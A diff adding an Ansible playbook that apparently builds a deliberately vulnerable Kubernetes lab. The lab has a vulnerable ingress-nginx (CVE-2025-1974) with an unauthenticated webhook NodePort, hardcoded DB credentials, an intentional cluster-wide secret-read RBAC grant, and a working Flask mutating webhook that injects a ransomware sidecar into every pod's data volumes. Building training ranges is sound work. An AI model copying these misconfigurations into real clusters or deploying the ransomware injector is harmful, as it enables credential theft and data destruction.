@@ -1,0 +1,545 @@
+---
+# =============================================================
+# Variables (set overrides in config.yml or via -e):
+#
+# --- Infrastructure ---
+#   prod_db_name:                     postgres                    PostgreSQL database name
+#   prod_db_user:                     produser                    PostgreSQL superuser username
+#   prod_db_password:                 Pr0dPassw0rd!               PostgreSQL superuser password
+#   prod_db_image:                    postgres:15                 PostgreSQL container image
+#   prod_db_port:                     5432                        PostgreSQL container port
+#   prod_db_storage_size:             1Gi                         PVC storage size for postgres data
+#   prod_cicd_sa:                     prod-cicd                   CI/CD service account name
+#   prod_cicd_token_secret:           prod-cicd-token             Long-lived SA token secret name
+#   prod_db_secret_name:              prod-db-credentials         DB credentials secret name
+#   prod_app_secret_name:             prod-app-config             Combined application secret name
+#   vuln_ingress_version:             1.11.4                      ingress-nginx controller version (CVE-2025-1974)
+#   vuln_ingress_chart_version:       4.10.6                      Helm chart version matching controller
+#   vuln_ingress_namespace:           ingress-nginx               Namespace for ingress-nginx deployment
+#   vuln_ingress_webhook_nodeport:    32443                       NodePort for unauthenticated webhook access
+#
+# --- Attack simulation ---
+#   attacker_nodeport_start:          30000                       Start of NodePort scan range
+#   attacker_nodeport_end:            32767                       End of NodePort scan range
+#   attacker_payload_c:               /tmp/payload.c              Path for shared library C source
+#   attacker_payload_so:              /tmp/payload.so             Path for compiled shared library
+#   attacker_exploit_script:          /tmp/ingressnightmare.py    Path for CVE-2025-1974 exploit script
+#   attacker_exploit_marker:          /tmp/pwned-cve-2025-1974    Marker file written by RCE payload (inside pod)
+#   ingress_sa_token_path:            /var/run/secrets/kubernetes.io/serviceaccount/token
+#   ransomware_webhook_name:          ransomware-injector         MutatingWebhookConfiguration name
+#   ransomware_webhook_namespace:     default                     Namespace for attacker webhook server pod
+#   ransomware_image:                 ludus-ransomware-sidecar:latest  Image injected as sidecar
+#   ransomware_dockerfile_dest:       /tmp/ransomware-sidecar     Directory for Dockerfile + encrypt.py
+#   ransomware_fernet_key:            ZmDfcTF7_60GrrY167zsiPd2H8890ZmmD4OjB_6zgOM=  Hardcoded encryption key
+# =============================================================
+
+
+# ==============================================================
+# Section 1 — Prod namespace and database
+# ==============================================================
+
+- name: Create prod namespace
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Namespace
+      metadata:
+        name: prod
+        labels:
+          environment: prod
+
+- name: Wait for default service account to be provisioned in prod namespace
+  kubernetes.core.k8s_info:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    kind: ServiceAccount
+    name: default
+    namespace: prod
+  register: _prod_default_sa
+  until: _prod_default_sa.resources | length > 0
+  retries: 12
+  delay: 5
+
+- name: Create PersistentVolumeClaim for PostgreSQL data
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: PersistentVolumeClaim
+      metadata:
+        name: postgres-pvc
+        namespace: prod
+      spec:
+        accessModes:
+          - ReadWriteOnce
+        resources:
+          requests:
+            storage: "{{ prod_db_storage_size }}"
+
+- name: Deploy PostgreSQL pod
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: postgres
+        namespace: prod
+        labels:
+          app: postgres
+      spec:
+        containers:
+          - name: postgres
+            image: "{{ prod_db_image }}"
+            ports:
+              - containerPort: "{{ prod_db_port }}"
+            env:
+              - name: POSTGRES_USER
+                value: "{{ prod_db_user }}"
+              - name: POSTGRES_PASSWORD
+                value: "{{ prod_db_password }}"
+              - name: POSTGRES_DB
+                value: "{{ prod_db_name }}"
+            volumeMounts:
+              - name: postgres-data
+                mountPath: /var/lib/postgresql/data
+        volumes:
+          - name: postgres-data
+            persistentVolumeClaim:
+              claimName: postgres-pvc
+
+- name: Create ClusterIP service for PostgreSQL
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Service
+      metadata:
+        name: postgres
+        namespace: prod
+      spec:
+        type: ClusterIP
+        selector:
+          app: postgres
+        ports:
+          - name: postgres
+            port: "{{ prod_db_port }}"
+            targetPort: "{{ prod_db_port }}"
+
+
+# ==============================================================
+# Section 2 — Prod service account and RBAC
+# ==============================================================
+
+- name: Create prod-cicd service account
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: ServiceAccount
+      metadata:
+        name: "{{ prod_cicd_sa }}"
+        namespace: prod
+
+- name: Create prod-cicd ClusterRole
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: ClusterRole
+      metadata:
+        name: prod-cicd-role
+      rules:
+        - apiGroups: ["", "apps"]
+          resources: ["pods", "deployments", "secrets"]
+          verbs: ["get", "list", "create", "delete"]
+        - apiGroups: ["admissionregistration.k8s.io"]
+          resources: ["mutatingwebhookconfigurations"]
+          verbs: ["create"]
+
+- name: Bind prod-cicd ClusterRole to prod-cicd service account
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: ClusterRoleBinding
+      metadata:
+        name: prod-cicd-binding
+      roleRef:
+        apiGroup: rbac.authorization.k8s.io
+        kind: ClusterRole
+        name: prod-cicd-role
+      subjects:
+        - kind: ServiceAccount
+          name: "{{ prod_cicd_sa }}"
+          namespace: prod
+
+- name: Create long-lived token secret for prod-cicd
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Secret
+      metadata:
+        name: "{{ prod_cicd_token_secret }}"
+        namespace: prod
+        annotations:
+          kubernetes.io/service-account.name: "{{ prod_cicd_sa }}"
+      type: kubernetes.io/service-account-token
+
+
+# ==============================================================
+# Section 3 — Secrets
+# ==============================================================
+
+- name: Create DB credentials secret
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Secret
+      metadata:
+        name: "{{ prod_db_secret_name }}"
+        namespace: prod
+      type: Opaque
+      stringData:
+        username: "{{ prod_db_user }}"
+        password: "{{ prod_db_password }}"
+
+- name: Wait for prod-cicd token to be populated by Kubernetes
+  kubernetes.core.k8s_info:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    kind: Secret
+    name: "{{ prod_cicd_token_secret }}"
+    namespace: prod
+  register: _prod_cicd_token_secret
+  until: >-
+    _prod_cicd_token_secret.resources | length > 0 and
+    _prod_cicd_token_secret.resources[0].data.token is defined
+  retries: 12
+  delay: 5
+
+- name: Store prod-cicd token as a fact
+  ansible.builtin.set_fact:
+    _prod_cicd_token: "{{ _prod_cicd_token_secret.resources[0].data.token | b64decode }}"
+
+- name: Create combined prod-app-config secret (DB credentials + CI/CD service account token)
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Secret
+      metadata:
+        name: "{{ prod_app_secret_name }}"
+        namespace: prod
+      type: Opaque
+      stringData:
+        db_host: "postgres.prod.svc.cluster.local"
+        db_port: "{{ prod_db_port | string }}"
+        db_name: "{{ prod_db_name }}"
+        db_username: "{{ prod_db_user }}"
+        db_password: "{{ prod_db_password }}"
+        service_account_token: "{{ _prod_cicd_token }}"
+
+
+# ==============================================================
+# Section 4 — Vulnerable ingress-nginx (CVE-2025-1974)
+# ==============================================================
+
+- name: Add ingress-nginx Helm repository
+  become: true
+  become_user: "{{ microk8s_user }}"
+  kubernetes.core.helm_repository:
+    name: ingress-nginx
+    repo_url: "https://kubernetes.github.io/ingress-nginx"
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+
+- name: "Install ingress-nginx controller {{ vuln_ingress_version }} (CVE-2025-1974)"
+  become: true
+  become_user: "{{ microk8s_user }}"
+  kubernetes.core.helm:
+    name: ingress-nginx
+    chart_ref: ingress-nginx/ingress-nginx
+    chart_version: "{{ vuln_ingress_chart_version }}"
+    release_namespace: "{{ vuln_ingress_namespace }}"
+    create_namespace: true
+    update_repo_cache: true
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    values:
+      controller:
+        extraArgs:
+          update-status: "true"
+        admissionWebhooks:
+          enabled: true
+          failurePolicy: Fail
+        # allow-snippet-annotations must be true for server-snippet injection (CVE-2025-1974 precondition)
+        config:
+          allow-snippet-annotations: "true"
+
+- name: Wait for ingress-nginx controller rollout
+  ansible.builtin.shell:
+    cmd: |
+      microk8s kubectl rollout status deployment/ingress-nginx-controller \
+        -n {{ vuln_ingress_namespace }} --timeout=120s
+  changed_when: false
+  become: true
+  become_user: "{{ microk8s_user }}"
+
+- name: Expose admission controller webhook via unauthenticated NodePort
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Service
+      metadata:
+        name: ingress-nginx-admission-nodeport
+        namespace: "{{ vuln_ingress_namespace }}"
+        labels:
+          app.kubernetes.io/name: ingress-nginx
+          app.kubernetes.io/component: admission-nodeport
+      spec:
+        type: NodePort
+        selector:
+          app.kubernetes.io/name: ingress-nginx
+          app.kubernetes.io/instance: ingress-nginx
+          app.kubernetes.io/component: controller
+        ports:
+          - name: webhook
+            port: 443
+            targetPort: 8443
+            nodePort: "{{ vuln_ingress_webhook_nodeport }}"
+
+
+# ==============================================================
+# Section 5 — RBAC misconfiguration: ingress-nginx SA secret read
+# ==============================================================
+# Intentional misconfiguration: grants the ingress-nginx service
+# account get/list access to secrets cluster-wide, enabling
+# cross-namespace credential theft in step 4 of the attack chain.
+
+- name: Create ClusterRole granting ingress-nginx SA secret read access (misconfiguration)
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: ClusterRole
+      metadata:
+        name: ingress-nginx-secret-reader
+      rules:
+        - apiGroups: [""]
+          resources: ["secrets"]
+          verbs: ["get", "list"]
+
+- name: Bind secret-reader ClusterRole to ingress-nginx service account (misconfiguration)
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: ClusterRoleBinding
+      metadata:
+        name: ingress-nginx-secret-reader-binding
+      roleRef:
+        apiGroup: rbac.authorization.k8s.io
+        kind: ClusterRole
+        name: ingress-nginx-secret-reader
+      subjects:
+        - kind: ServiceAccount
+          name: ingress-nginx
+          namespace: "{{ vuln_ingress_namespace }}"
+
+
+# ==============================================================
+# Section 6 — Ransomware webhook server (attacker-controlled infra)
+# ==============================================================
+# Deploys the webhook server the attacker will point their
+# MutatingWebhookConfiguration at in step 6 of the attack chain.
+# Registered using the stolen prod-cicd token, not cluster-admin.
+
+- name: Generate TLS cert for ransomware webhook server
+  become: true
+  become_user: "{{ microk8s_user }}"
+  ansible.builtin.shell:
+    cmd: |
+      openssl req -x509 -newkey rsa:2048 \
+        -keyout /home/{{ microk8s_user }}/ransomware-webhook-key.pem \
+        -out /home/{{ microk8s_user }}/ransomware-webhook-cert.pem \
+        -days 365 -nodes \
+        -subj "/CN=ransomware-webhook.{{ ransomware_webhook_namespace }}.svc" \
+        -addext "subjectAltName=DNS:ransomware-webhook.{{ ransomware_webhook_namespace }}.svc,DNS:ransomware-webhook.{{ ransomware_webhook_namespace }}.svc.cluster.local"
+  changed_when: true
+
+- name: Create TLS secret for ransomware webhook server
+  become: true
+  become_user: "{{ microk8s_user }}"
+  ansible.builtin.shell:
+    cmd: |
+      microk8s kubectl create secret tls ransomware-webhook-tls \
+        --cert=/home/{{ microk8s_user }}/ransomware-webhook-cert.pem \
+        --key=/home/{{ microk8s_user }}/ransomware-webhook-key.pem \
+        --namespace={{ ransomware_webhook_namespace }} \
+        --dry-run=client -o yaml | microk8s kubectl apply -f -
+  changed_when: true
+
+- name: Read ransomware webhook CA bundle
+  become: true
+  become_user: "{{ microk8s_user }}"
+  ansible.builtin.shell:
+    cmd: base64 -w 0 /home/{{ microk8s_user }}/ransomware-webhook-cert.pem
+  register: _ransomware_webhook_cabundle
+  changed_when: false
+
+- name: Create ConfigMap with ransomware webhook server script
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: ConfigMap
+      metadata:
+        name: ransomware-webhook-script
+        namespace: "{{ ransomware_webhook_namespace }}"
+      data:
+        webhook.py: |
+          from flask import Flask, request, jsonify
+          import base64, json
+
+          app = Flask(__name__)
+
+          RANSOMWARE_IMAGE = "{{ ransomware_image }}"
+
+          @app.route('/healthz', methods=['GET'])
+          def healthz():
+              return 'ok', 200
+
+          @app.route('/mutate', methods=['POST'])
+          def mutate():
+              review = request.get_json()
+              uid = review['request']['uid']
+              spec = review['request'].get('object', {}).get('spec', {})
+
+              patch = []
+
+              # Build volumeMounts for the sidecar: map every existing data volume to /mnt/<name>.
+              # Exclude projected SA token volumes (kube-api-access-*) — they are read-only
+              # and would cause the encryption script to crash on RANSOM.txt write.
+              existing_volumes = spec.get('volumes', [])
+              volume_mounts = [
+                  {"name": v['name'], "mountPath": f"/mnt/{v['name']}"}
+                  for v in existing_volumes
+                  if 'name' in v and not v['name'].startswith('kube-api-access')
+              ]
+
+              # Inject ransomware sidecar into every pod
+              patch.append({
+                  "op": "add",
+                  "path": "/spec/containers/-",
+                  "value": {
+                      "name": "ransomware-sidecar",
+                      "image": RANSOMWARE_IMAGE,
+                      "imagePullPolicy": "Never",
+                      "volumeMounts": volume_mounts
+                  }
+              })
+
+              return jsonify({
+                  "apiVersion": "admission.k8s.io/v1",
+                  "kind": "AdmissionReview",
+                  "response": {
+                      "uid": uid,
+                      "allowed": True,
+                      "patchType": "JSONPatch",
+                      "patch": base64.b64encode(json.dumps(patch).encode()).decode()
+                  }
+              })
+
+          if __name__ == '__main__':
+              app.run(host='0.0.0.0', port=8443,
+                      ssl_context=('/certs/tls.crt', '/certs/tls.key'))
+
+- name: Delete ransomware webhook pod if it exists
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: absent
+    api_version: v1
+    kind: Pod
+    name: ransomware-webhook
+    namespace: "{{ ransomware_webhook_namespace }}"
+    wait: true
+
+- name: Deploy ransomware webhook server pod
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: ransomware-webhook
+        namespace: "{{ ransomware_webhook_namespace }}"
+        labels:
+          app: ransomware-webhook
+      spec:
+        containers:
+          - name: webhook
+            image: python:3.11-alpine
+            command: ["/bin/sh", "-c", "pip install flask --quiet && python /webhook/webhook.py"]
+            ports:
+              - containerPort: 8443
+            readinessProbe:
+              httpGet:
+                path: /healthz
+                port: 8443
+                scheme: HTTPS
+              initialDelaySeconds: 30
+              periodSeconds: 5
+              failureThreshold: 10
+            volumeMounts:
+              - name: script
+                mountPath: /webhook
+              - name: tls
+                mountPath: /certs
+        volumes:
+          - name: script
+            configMap:
+              name: ransomware-webhook-script
+          - name: tls
+            secret:
+              secretName: ransomware-webhook-tls
+
+- name: Create service for ransomware webhook server
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Service
+      metadata:
+        name: ransomware-webhook
+        namespace: "{{ ransomware_webhook_namespace }}"
+      spec:
+        selector:
+          app: ransomware-webhook
+        ports:
+          - port: 443
+            targetPort: 8443
+
+- name: Wait for ransomware webhook pod to be ready
+  ansible.builtin.command:
+    cmd: microk8s kubectl wait pod/ransomware-webhook -n {{ ransomware_webhook_namespace }} --for=condition=Ready --timeout=120s
+  changed_when: false
+  become: true
+  become_user: "{{ microk8s_user }}"
